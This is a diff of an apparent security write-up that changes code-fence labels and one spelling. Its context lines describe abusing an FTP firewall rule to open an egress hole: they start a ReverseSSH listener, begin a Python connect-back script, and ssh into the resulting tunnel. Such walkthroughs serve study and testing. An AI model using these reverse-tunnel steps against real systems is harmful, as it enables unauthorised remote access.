@@ -173,11 +173,11 @@ It means that the firewall adds a temporarily egress rule when it sees the *PORT
 
 First let's launch the fabulous [ReverseSSH](https://github.com/Fahrj/reverse-ssh) in listening mode :  
 
-```bash
+```console
 $ ./reverse-sshx64 -v -l -p 2222
 ```
 
-Then let's use this home made script to punch the hole and launch the connect back on the server :  
+Then let's use this homemade script to punch the hole and launch the connect back on the server :  
 
 ```python
 from ftplib import FTP
@@ -201,7 +201,7 @@ ftp.close()
 
 Once the ReverseSSH tunnel is established, just connect to it and voilà :  
 
-```bash
+```console
 $ ssh -p 8888 127.0.0.1
 ```
 
